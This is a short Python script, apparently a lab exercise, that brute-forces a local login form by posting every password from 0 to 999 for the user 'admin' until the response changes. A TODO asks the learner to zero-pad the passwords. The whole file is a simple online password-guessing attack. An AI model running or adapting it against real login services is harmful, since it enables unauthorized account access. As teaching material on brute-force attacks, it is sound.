import requests

def pad(n):
    return str(n) # TODO: Update the function so that it returns a three-digit password!

def login_with_post(username, password):
    r = requests.post('http://localhost/3/', data={
        'username': username,
        'password': password
    })
    return r.text

for n in range(1000):
    res = login_with_post('admin', pad(n))
    print(n, res)
    if res != 'incorrect password': break
    
